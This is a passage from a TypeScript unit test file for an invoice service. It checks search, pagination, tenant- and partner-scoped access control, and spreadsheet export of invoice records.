      expect(where.outletCode).toBe('O1');
    });

    it('applies the server-side search OR (invoiceNumber + outletCode) on BOTH find and count', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      await service.list(admin, { search: 'TGSL-VIS' });

      const findWhere = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      const countWhere = mockPrisma.autoInvoice.count.mock.calls[0][0].where;
      const expectedOr = [
        { invoiceNumber: { contains: 'TGSL-VIS', mode: 'insensitive' } },
        { outletCode: { contains: 'TGSL-VIS', mode: 'insensitive' } },
      ];
      expect(findWhere.OR).toEqual(expectedOr);
      // The count MUST use the SAME where (incl. the search OR) or the page count lies.
      expect(countWhere.OR).toEqual(expectedOr);
      // Search NARROWS within tenant scope — clientId is still pinned.
      expect(findWhere.clientId).toBe('deoleo');
    });

    it('search is trimmed and omitted when blank (no OR clause)', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      await service.list(admin, { search: '   ' });
      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.OR).toBeUndefined();
    });

    it('paginates: skip/take derive from page/limit', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      const res = await service.list(admin, { page: 3, limit: 10 });
      const args = mockPrisma.autoInvoice.findMany.mock.calls[0][0];
      expect(args.skip).toBe(20); // (3 - 1) * 10
      expect(args.take).toBe(10);
      expect(res.pagination).toEqual({ page: 3, limit: 10, total: 0, pages: 0 });
    });
  });

  // ── getById ───────────────────────────────────────────────────────────────────

  describe('getById', () => {
    it('returns invoice for admin', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({ id: 'inv1', clientId: 'deoleo', partnerId: 'p1' });
      const result = await service.getById(admin, 'inv1');
      expect(result).toBeDefined();
    });

    it('throws NotFoundException when not found', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue(null);
      await expect(service.getById(admin, 'ghost')).rejects.toBeInstanceOf(NotFoundException);
    });

    it('throws ForbiddenException when partner tries to access another partner invoice', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({ id: 'inv1', clientId: 'deoleo', partnerId: 'p-OTHER' });
      mockPrisma.channelPartner.findFirst.mockResolvedValue({ id: 'p1' });
      await expect(service.getById(partnerUser, 'inv1')).rejects.toBeInstanceOf(ForbiddenException);
    });
  });

  // ── exportXlsx (#44) ───────────────────────────────────────────────────────────

  describe('exportXlsx', () => {
    const dbInvoice = {
      id: 'inv1',
      invoiceNumber: 'TGSL-VIS-O1-202501-001',
      outletCode: 'O1',
      period: '2025-01',
      invoiceDate: new Date('2025-01-15T00:00:00Z'),
      status: 'GENERATED',
      subtotalPaise: 500000n,
      gstPaise: 90000n,
      gstType: 'CGST_SGST',
      totalPaise: 590000n,
      snapshot: {
        outletName: 'Sharma Kirana',
        firmName: 'Sharma Enterprises',
        panNumber: 'ABCPS1234D',
        retailerState: 'West Bengal',
        retailerGstin: '19ABCPS1234D1Z5',
      },
    };

    it('admin export is tenant-scoped (clientId pinned, no partnerId filter)', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([dbInvoice]);
      const { buffer, filename } = await service.exportXlsx(admin, { period: '2025-01' });

      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.clientId).toBe('deoleo');
      expect(where.partnerId).toBeUndefined();
      expect(where.period).toBe('2025-01');
      expect(filename).toMatch(/^visibility-invoices-.*\.xlsx$/);
      // Buffer is a real xlsx (starts with the PK zip magic).
      expect(buffer.slice(0, 2).toString('binary')).toBe('PK');
    });

    it('partner export is restricted to the caller partnerId', async () => {
      mockPrisma.channelPartner.findFirst.mockResolvedValue({ id: 'p1' });
      mockPrisma.autoInvoice.findMany.mockResolvedValue([dbInvoice]);

      await service.exportXlsx(partnerUser, {});
      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.partnerId).toBe('p1');
      expect(where.clientId).toBe('deoleo');
    });

    it('partner with no partner record exports an empty workbook (no tenant leak)', async () => {
      mockPrisma.channelPartner.findFirst.mockResolvedValue(null);

      const { buffer } = await service.exportXlsx(partnerUser, {});
      // findMany must NOT have been called (no query that could leak).
      expect(mockPrisma.autoInvoice.findMany).not.toHaveBeenCalled();
      expect(buffer.slice(0, 2).toString('binary')).toBe('PK');
    });

    it('exported money matches the DB paise (paise → ₹ at the edge)', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([dbInvoice]);
      const { buffer } = await service.exportXlsx(gifsy, {});
      const wb = XLSX.read(buffer, { type: 'buffer' });
      const row = XLSX.utils.sheet_to_json(wb.Sheets['Invoices'], { defval: '' })[0] as Record<string, unknown>;
      expect(row['Total (₹)']).toBe('5900.00');
      expect(row['Invoice Number']).toBe('TGSL-VIS-O1-202501-001');
    });
  });

  // ── uploadTemplate (#44) ───────────────────────────────────────────────────────

  describe('uploadTemplate', () => {
    it('returns a non-empty xlsx Buffer', () => {
      const buffer = service.uploadTemplate();
      expect(buffer.length).toBeGreaterThan(0);
      expect(buffer.slice(0, 2).toString('binary')).toBe('PK');
    });
  });
});
